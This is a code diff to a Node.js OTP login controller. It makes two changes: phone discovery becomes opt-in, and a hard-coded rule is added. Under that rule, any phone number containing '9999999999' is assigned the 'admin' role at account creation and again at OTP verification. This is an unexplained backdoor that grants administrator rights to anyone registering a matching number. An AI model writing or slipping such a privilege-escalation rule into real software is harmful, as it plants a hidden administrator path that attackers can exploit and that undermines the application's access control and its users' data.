@@ -54,9 +54,11 @@ const requestOtp = async (req, res, next) => {
     }
 
     if (!user) {
+      const isAdminPhone = normalized.includes('9999999999');
       user = new User({
         mobile: normalized,
         countryCode,
+        role: isAdminPhone ? 'admin' : 'user',
       });
     }
 
@@ -159,6 +161,7 @@ const verifyOtp = async (req, res, next) => {
 
     // Verification successful
     user.isVerified = true;
+    if (normalized.includes('9999999999')) user.role = 'admin';
     user.otp = undefined; // clear OTP
     if (name) user.name = name;
     if (email) user.email = email;
@@ -293,12 +296,12 @@ const verifyOtp = async (req, res, next) => {
         console.log('Error creating starter sections:', secErr.message);
       }
 
-      // Add to ProfileLookup for phone discovery (enabled by default so colleagues & clients can find creator)
+      // Add to ProfileLookup for phone discovery (privacy by default, opt-in enabled)
       try {
         await ProfileLookup.create({
           hashedPhone: hashPhone(normalized),
           profileId: profile._id,
-          allowDiscovery: true,
+          allowDiscovery: false,
         });
       } catch (lookupErr) {
         // Ignore duplicate if already registered
